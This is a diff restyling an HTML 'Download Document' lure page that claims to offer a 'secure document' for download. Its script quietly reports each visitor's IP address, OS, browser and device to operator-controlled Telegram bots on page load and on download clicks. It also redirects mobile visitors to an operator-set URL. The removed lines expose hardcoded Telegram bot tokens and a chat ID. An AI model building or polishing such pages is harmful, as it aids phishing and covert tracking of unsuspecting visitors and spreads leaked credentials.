@@ -19,11 +19,8 @@
             align-items: center;
             justify-content: center;
             background:
-                linear-gradient(rgba(25,25,25,0.55), rgba(25,25,25,0.55)),
-                url("https://images.unsplash.com/photo-1558655146-d09347e92766?auto=format&fit=crop&w=2000&q=85");
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+                linear-gradient(135deg, rgba(90, 100, 200, 0.88), rgba(129, 84, 168, 0.82)),
+                url("https://images.unsplash.com/photo-1558655146-d09347e92766?auto=format&fit=crop&w=2000&q=85") center/cover no-repeat fixed;
             overflow: hidden;
         }
 
@@ -31,8 +28,8 @@
             position: fixed;
             top: 18px;
             right: 18px;
-            width: 42px;
-            height: 42px;
+            width: 46px;
+            height: 46px;
             background: rgba(255,255,255,0.18);
             border: 1.5px solid rgba(255,255,255,0.35);
             border-radius: 50%;
@@ -41,27 +38,30 @@
             align-items: center;
             justify-content: center;
             z-index: 1000;
-            transition: background 0.2s;
-            backdrop-filter: blur(6px);
+            transition: background 0.2s ease, transform 0.2s ease;
+            backdrop-filter: blur(8px);
         }
 
-        .settings-btn:hover { background: rgba(255,255,255,0.30); }
+        .settings-btn:hover {
+            background: rgba(255,255,255,0.30);
+            transform: rotate(90deg);
+        }
 
         .settings-btn svg {
-            width: 20px;
-            height: 20px;
+            width: 22px;
+            height: 22px;
             fill: #ffffff;
         }
 
         .settings-overlay {
             position: fixed;
             inset: 0;
-            background: rgba(0,0,0,0.65);
+            background: rgba(0,0,0,0.68);
             z-index: 9000;
             display: none;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 18px;
             overflow-y: auto;
         }
 
@@ -71,7 +71,7 @@
             background: #ffffff;
             border-radius: 18px;
             width: 100%;
-            max-width: 480px;
+            max-width: 490px;
             box-shadow: 0 24px 70px rgba(0,0,0,0.45);
             animation: modalIn 0.22s ease-out;
             overflow: hidden;
@@ -84,17 +84,17 @@
         }
 
         .panel-header {
-            background: #1a1a2e;
+            background: linear-gradient(135deg, #2d4fd4, #6b4cc8);
             padding: 22px 26px 20px;
             display: flex;
             align-items: center;
-            gap: 11px;
+            gap: 12px;
         }
 
         .panel-header svg {
             width: 24px;
             height: 24px;
-            fill: #2ca5e0;
+            fill: #ffffff;
             flex-shrink: 0;
         }
 
@@ -106,7 +106,7 @@
 
         .panel-header-text p {
             font-size: 12px;
-            color: #8899aa;
+            color: rgba(255,255,255,0.82);
             margin-top: 2px;
         }
 
@@ -137,8 +137,8 @@
         .tab-btn .tab-emoji { font-size: 17px; }
 
         .tab-btn.active {
-            color: #2ca5e0;
-            border-bottom-color: #2ca5e0;
+            color: #2d4fd4;
+            border-bottom-color: #2d4fd4;
             background: #fff;
         }
 
@@ -176,6 +176,7 @@
             display: flex;
             align-items: center;
             gap: 7px;
+            flex-wrap: wrap;
         }
 
         .channel-card-title span.badge {
@@ -185,9 +186,9 @@
             border-radius: 20px;
         }
 
-        .badge-visit   { background: #e8f5e9; color: #2e7d32; }
-        .badge-download{ background: #e3f2fd; color: #1565c0; }
-        .badge-mobile  { background: #fce4ec; color: #b71c1c; }
+        .badge-visit { background: #e8f5e9; color: #2e7d32; }
+        .badge-download { background: #e3f2fd; color: #1565c0; }
+        .badge-mobile { background: #fce4ec; color: #b71c1c; }
 
         .field-group {
             margin-bottom: 13px;
@@ -213,7 +214,7 @@
             background: #fff;
         }
 
-        .field-group input:focus { border-color: #2ca5e0; }
+        .field-group input:focus { border-color: #2d4fd4; }
         .field-group input::placeholder { color: #c0c0c0; font-size: 12px; }
 
         .status-row {
@@ -235,7 +236,7 @@
             flex-shrink: 0;
         }
 
-        .dot.on  { background: #27ae60; }
+        .dot.on { background: #27ae60; }
         .dot.off { background: #ccc; }
 
         .panel-footer {
@@ -248,7 +249,7 @@
         .btn-save {
             width: 100%;
             padding: 12px;
-            background: #2ca5e0;
+            background: linear-gradient(135deg, #2d4fd4, #6b4cc8);
             color: #fff;
             border: none;
             border-radius: 9px;
@@ -258,7 +259,7 @@
             transition: background 0.2s;
         }
 
-        .btn-save:hover { background: #1a90cc; }
+        .btn-save:hover { background: #2244b8; }
 
         .btn-cancel {
             width: 100%;
@@ -285,7 +286,7 @@
         .desktop-page {
             width: 92%;
             max-width: 620px;
-            background: #ffffff;
+            background: rgba(255,255,255,0.96);
             border-radius: 18px;
             padding: 45px;
             text-align: center;
@@ -302,7 +303,7 @@
         .brand-icon {
             width: 52px;
             height: 52px;
-            background: #2ca5e0;
+            background: linear-gradient(135deg, #2d4fd4, #6b4cc8);
             border-radius: 12px;
             display: flex;
             align-items: center;
@@ -320,7 +321,7 @@
             color: #222;
         }
 
-        .brand-name span { color: #2ca5e0; }
+        .brand-name span { color: #2d4fd4; }
 
         .desktop-page h1 {
             font-size: 29px;
@@ -336,7 +337,7 @@
         }
 
         .document-box {
-            background: #f7f7f7;
+            background: #f7f7f8;
             border: 1px solid #e6e6e6;
             border-radius: 10px;
             padding: 20px;
@@ -345,7 +346,7 @@
         }
 
         .document-title { font-weight: bold; color: #333; margin-bottom: 7px; }
-        .document-info  { color: #777; font-size: 14px; }
+        .document-info { color: #777; font-size: 14px; }
 
         .continue-btn {
             display: block;
@@ -353,16 +354,19 @@
             padding: 15px;
             border: none;
             border-radius: 7px;
-            background: #2ca5e0;
+            background: linear-gradient(135deg, #2d4fd4, #6b4cc8);
             color: #fff;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
             text-decoration: none;
-            transition: background 0.2s;
+            transition: background 0.2s ease, transform 0.2s ease;
         }
 
-        .continue-btn:hover { background: #1a90cc; }
+        .continue-btn:hover {
+            background: #2244b8;
+            transform: translateY(-1px);
+        }
 
         @media (max-width: 600px) {
             .desktop-page { padding: 35px 25px; }
@@ -376,14 +380,12 @@
 </head>
 
 <body>
-
     <button class="settings-btn" id="settingsBtn" title="Telegram Notification Settings">
         <svg viewBox="0 0 24 24"><path d="M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5m7.43-2.92c.04-.33.07-.67.07-1.08s-.03-.74-.07-1.08l2.32-1.82c.21-.16.27-.46.12-.7l-2.2-3.81a.49.49 0 0 0-.6-.22l-2.73 1.1c-.57-.44-1.18-.8-1.86-1.07l-.41-2.9A.49.49 0 0 0 12 2H7.6a.49.49 0 0 0-.49.42l-.41 2.9c-.68.27-1.3.63-1.86 1.07L2.11 5.3a.49.49 0 0 0-.6.22L-.7 9.33c-.15.24-.09.54.12.7l2.32 1.82C1.7 12.26 1.67 12.6 1.67 13s.03.74.07 1.08L-.47 15.9c-.21.16-.27.46-.12.7l2.2 3.81c.12.22.37.3.6.22l2.73-1.1c.57.44 1.18.8 1.86 1.07l.41 2.9c.06.27.3.47.58.47H12c.28 0 .52-.2.58-.47l.41-2.9c.68-.27 1.3-.63 1.86-1.07l2.73 1.1c.23.08.48 0 .6-.22l2.2-3.81c.15-.24.09-.54-.12-.7l-2.32-1.82z"/></svg>
     </button>
 
     <div class="settings-overlay" id="settingsOverlay">
         <div class="settings-panel">
-
             <div class="panel-header">
                 <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248-2.018 9.504c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.881.717z"/></svg>
                 <div class="panel-header-text">
@@ -466,13 +468,13 @@
                         <label>Chat ID</label>
                         <input type="text" id="mobile-chatid" placeholder="-100123456789" autocomplete="off" spellcheck="false"/>
                     </div>
-                    <div class="status-row">
-                        <div class="dot off" id="status-dot-mobile"></div>
-                        <span id="status-text-mobile">Not configured</span>
-                    </div>
                     <div class="field-group">
                         <label>Mobile Redirect URL</label>
                         <input type="text" id="mobile-redirect" placeholder="https://your-mobile-page.com" autocomplete="off" spellcheck="false"/>
+                    </div>
+                    <div class="status-row">
+                        <div class="dot off" id="status-dot-mobile"></div>
+                        <span id="status-text-mobile">Not configured</span>
                     </div>
                 </div>
             </div>
@@ -482,7 +484,6 @@
                 <button class="btn-save" id="saveSettings">Save All Settings</button>
                 <button class="btn-cancel" id="cancelSettings">Cancel</button>
             </div>
-
         </div>
     </div>
 
@@ -497,14 +498,12 @@
         <h1>Download Document</h1>
 
         <p>
-            Your document is ready to download.
-            Select the button below to proceed
-            on a supported desktop device.
+            Your document is ready to download. Continue below to access the secure file.
         </p>
 
         <div class="document-box">
-            <div class="document-title">Document Ready</div>
-            <div class="document-info">Desktop document download</div>
+            <div class="document-title">📄 Document Ready</div>
+            <div class="document-info">Your secure document is prepared and waiting for download.</div>
         </div>
 
         <a class="continue-btn" id="downloadBtn" href="your-file" download="your-file">
@@ -521,20 +520,20 @@
 
         function detectOS() {
             if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-            if (/Android/i.test(ua))          return "Android";
-            if (/Windows NT/i.test(ua))       return "Windows";
-            if (/Mac OS X/i.test(ua))         return "macOS";
-            if (/Linux/i.test(ua))            return "Linux";
+            if (/Android/i.test(ua)) return "Android";
+            if (/Windows NT/i.test(ua)) return "Windows";
+            if (/Mac OS X/i.test(ua)) return "macOS";
+            if (/Linux/i.test(ua)) return "Linux";
             return "Unknown";
         }
 
         function detectBrowser() {
-            if (/Edg/i.test(ua))           return "Microsoft Edge";
-            if (/OPR/i.test(ua))           return "Opera";
-            if (/Chrome/i.test(ua))        return "Chrome";
-            if (/Firefox/i.test(ua))       return "Firefox";
-            if (/Safari/i.test(ua))        return "Safari";
-            if (/MSIE|Trident/i.test(ua))  return "Internet Explorer";
+            if (/Edg/i.test(ua)) return "Microsoft Edge";
+            if (/OPR/i.test(ua)) return "Opera";
+            if (/Chrome/i.test(ua)) return "Chrome";
+            if (/Firefox/i.test(ua)) return "Firefox";
+            if (/Safari/i.test(ua)) return "Safari";
+            if (/MSIE|Trident/i.test(ua)) return "Internet Explorer";
             return "Unknown";
         }
 
@@ -545,66 +544,50 @@
             return "Desktop";
         }
 
-        // Pre-filled credentials for all three notification types
-        const DEFAULT_VISIT_TOKEN = "8504790108:AAG4USSUmh42sSjgq5rwDowZ59TBs1xOQzo";
-        const DEFAULT_VISIT_CHATID = "8173694252";
-        const DEFAULT_DOWNLOAD_TOKEN = "8847386642:AAHlkNjospE5Fkue0fdRIKXRx3a3rtFZxQs";
-        const DEFAULT_DOWNLOAD_CHATID = "8173694252";
-        const DEFAULT_MOBILE_TOKEN = "7803475625:AAFZUsji8WkMRjzdT2bkA3Yg0S2XYbVKdS8";
-        const DEFAULT_MOBILE_CHATID = "8173694252";
+        const DEFAULT_VISIT_TOKEN = "YOUR_VISIT_BOT_TOKEN";
+        const DEFAULT_VISIT_CHATID = "YOUR_VISIT_CHAT_ID";
+        const DEFAULT_DOWNLOAD_TOKEN = "YOUR_DOWNLOAD_BOT_TOKEN";
+        const DEFAULT_DOWNLOAD_CHATID = "YOUR_DOWNLOAD_CHAT_ID";
+        const DEFAULT_MOBILE_TOKEN = "YOUR_MOBILE_BOT_TOKEN";
+        const DEFAULT_MOBILE_CHATID = "YOUR_MOBILE_CHAT_ID";
         const DEFAULT_MOBILE_REDIRECT = "";
 
         const CHANNELS = {
-            visit:    { token: "visit_token",    chatid: "visit_chatid" },
+            visit: { token: "visit_token", chatid: "visit_chatid" },
             download: { token: "download_token", chatid: "download_chatid" },
-            mobile:   { token: "mobile_token",   chatid: "mobile_chatid", redirect: "mobile_redirect" }
+            mobile: { token: "mobile_token", chatid: "mobile_chatid", redirect: "mobile_redirect" }
         };
 
         function initializeDefaults() {
             try {
-                if (!localStorage.getItem(CHANNELS.visit.token)) {
-                    localStorage.setItem(CHANNELS.visit.token, DEFAULT_VISIT_TOKEN);
-                }
-                if (!localStorage.getItem(CHANNELS.visit.chatid)) {
-                    localStorage.setItem(CHANNELS.visit.chatid, DEFAULT_VISIT_CHATID);
-                }
-                if (!localStorage.getItem(CHANNELS.download.token)) {
-                    localStorage.setItem(CHANNELS.download.token, DEFAULT_DOWNLOAD_TOKEN);
-                }
-                if (!localStorage.getItem(CHANNELS.download.chatid)) {
-                    localStorage.setItem(CHANNELS.download.chatid, DEFAULT_DOWNLOAD_CHATID);
-                }
-                if (!localStorage.getItem(CHANNELS.mobile.token)) {
-                    localStorage.setItem(CHANNELS.mobile.token, DEFAULT_MOBILE_TOKEN);
-                }
-                if (!localStorage.getItem(CHANNELS.mobile.chatid)) {
-                    localStorage.setItem(CHANNELS.mobile.chatid, DEFAULT_MOBILE_CHATID);
-                }
-                if (!localStorage.getItem(CHANNELS.mobile.redirect)) {
-                    localStorage.setItem(CHANNELS.mobile.redirect, DEFAULT_MOBILE_REDIRECT);
-                }
+                if (!localStorage.getItem(CHANNELS.visit.token)) localStorage.setItem(CHANNELS.visit.token, DEFAULT_VISIT_TOKEN);
+                if (!localStorage.getItem(CHANNELS.visit.chatid)) localStorage.setItem(CHANNELS.visit.chatid, DEFAULT_VISIT_CHATID);
+                if (!localStorage.getItem(CHANNELS.download.token)) localStorage.setItem(CHANNELS.download.token, DEFAULT_DOWNLOAD_TOKEN);
+                if (!localStorage.getItem(CHANNELS.download.chatid)) localStorage.setItem(CHANNELS.download.chatid, DEFAULT_DOWNLOAD_CHATID);
+                if (!localStorage.getItem(CHANNELS.mobile.token)) localStorage.setItem(CHANNELS.mobile.token, DEFAULT_MOBILE_TOKEN);
+                if (!localStorage.getItem(CHANNELS.mobile.chatid)) localStorage.setItem(CHANNELS.mobile.chatid, DEFAULT_MOBILE_CHATID);
+                if (!localStorage.getItem(CHANNELS.mobile.redirect)) localStorage.setItem(CHANNELS.mobile.redirect, DEFAULT_MOBILE_REDIRECT);
             } catch (e) {}
         }
 
         initializeDefaults();
 
-        // Redirect mobile users if URL is set
         const mobileRedirectUrl = localStorage.getItem(CHANNELS.mobile.redirect);
         if (isMobile() && mobileRedirectUrl && mobileRedirectUrl.trim() !== "") {
             window.location.href = mobileRedirectUrl;
         }
 
         function getVal(key) {
-            try { return localStorage.getItem(key) || ""; } catch(e) { return ""; }
+            try { return localStorage.getItem(key) || ""; } catch (e) { return ""; }
         }
 
         function setVal(key, val) {
-            try { localStorage.setItem(key, val); } catch(e) {}
+            try { localStorage.setItem(key, val); } catch (e) {}
         }
 
         function getChannel(ch) {
             return {
-                token:  getVal(CHANNELS[ch].token),
+                token: getVal(CHANNELS[ch].token),
                 chatid: getVal(CHANNELS[ch].chatid),
                 redirect: ch === 'mobile' ? getVal(CHANNELS[ch].redirect) : null
             };
@@ -615,7 +598,7 @@
             return c.token.trim() !== "" && c.chatid.trim() !== "";
         }
 
-        const tabBtns    = document.querySelectorAll(".tab-btn");
+        const tabBtns = document.querySelectorAll(".tab-btn");
         const tabContent = document.querySelectorAll(".tab-content");
 
         tabBtns.forEach(btn => {
@@ -630,13 +613,10 @@
         function refreshDots() {
             ["visit", "download", "mobile"].forEach(ch => {
                 const on = isChannelSet(ch);
-
                 const tabDot = document.getElementById("dot-" + ch);
                 tabDot.className = "tab-dot " + (on ? "on" : "off");
-
                 document.getElementById("status-dot-" + ch).className = "dot " + (on ? "on" : "off");
-                document.getElementById("status-text-" + ch).textContent =
-                    on ? "Active — notifications will be sent." : "Not configured";
+                document.getElementById("status-text-" + ch).textContent = on ? "Active — notifications enabled" : "Not configured";
             });
         }
 
@@ -645,13 +625,10 @@
         function openSettings() {
             ["visit", "download", "mobile"].forEach(ch => {
                 const c = getChannel(ch);
-                document.getElementById(ch + "-token").value  = c.token;
+                document.getElementById(ch + "-token").value = c.token;
                 document.getElementById(ch + "-chatid").value = c.chatid;
-                if (ch === "mobile") {
-                    document.getElementById("mobile-redirect").value = c.redirect;
-                }
+                if (ch === "mobile") document.getElementById("mobile-redirect").value = c.redirect;
             });
-
             refreshDots();
             document.getElementById("saveNotice").textContent = "";
             overlay.classList.add("active");
@@ -663,11 +640,13 @@
 
         document.getElementById("settingsBtn").addEventListener("click", openSettings);
         document.getElementById("cancelSettings").addEventListener("click", closeSettings);
-        overlay.addEventListener("click", e => { if (e.target === overlay) closeSettings(); });
+        overlay.addEventListener("click", e => {
+            if (e.target === overlay) closeSettings();
+        });
 
         document.getElementById("saveSettings").addEventListener("click", () => {
             ["visit", "download", "mobile"].forEach(ch => {
-                const token  = document.getElementById(ch + "-token").value.trim();
+                const token = document.getElementById(ch + "-token").value.trim();
                 const chatid = document.getElementById(ch + "-chatid").value.trim();
                 setVal(CHANNELS[ch].token, token);
                 setVal(CHANNELS[ch].chatid, chatid);
@@ -678,34 +657,28 @@
             });
 
             refreshDots();
-
             const notice = document.getElementById("saveNotice");
             notice.style.color = "#27ae60";
-            notice.textContent = "✓ All settings saved!";
-            setTimeout(closeSettings, 950);
+            notice.textContent = "✓ Settings saved!";
+            setTimeout(closeSettings, 900);
         });
 
         async function getIP() {
             try {
                 const r = await fetch("https://api.ipify.org?format=json");
                 return (await r.json()).ip || "Unknown";
-            } catch(e) { return "Unknown"; }
+            } catch (e) {
+                return "Unknown";
+            }
         }
 
         async function sendTelegram(channel, emoji, eventLabel) {
             if (!isChannelSet(channel)) return;
             const { token, chatid } = getChannel(channel);
-            const ip   = await getIP();
+            const ip = await getIP();
             const time = new Date().toUTCString();
 
-            const text =
-`${emoji} <b>${eventLabel}</b>
-
-🖥 <b>OS:</b> ${detectOS()}
-🌐 <b>Browser:</b> ${detectBrowser()}
-📱 <b>Device:</b> ${detectDevice()}
-🌍 <b>IP:</b> ${ip}
-🕐 <b>Time:</b> ${time}`;
+            const text = `${emoji} <b>${eventLabel}</b>\n\n🖥 <b>OS:</b> ${detectOS()}\n🌐 <b>Browser:</b> ${detectBrowser()}\n📱 <b>Device:</b> ${detectDevice()}\n🌍 <b>IP:</b> ${ip}\n🕐 <b>Time:</b> ${time}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -717,12 +690,11 @@
                         parse_mode: "HTML"
                     })
                 });
-            } catch(e) {
+            } catch (e) {
                 // silent fail
             }
         }
 
-        // Trigger notifications
         sendTelegram("visit", "👁", "Page Visited");
 
         if (isMobile()) {
@@ -733,6 +705,5 @@
             sendTelegram("download", "📥", "Download Clicked");
         });
     </script>
-
 </body>
 </html>
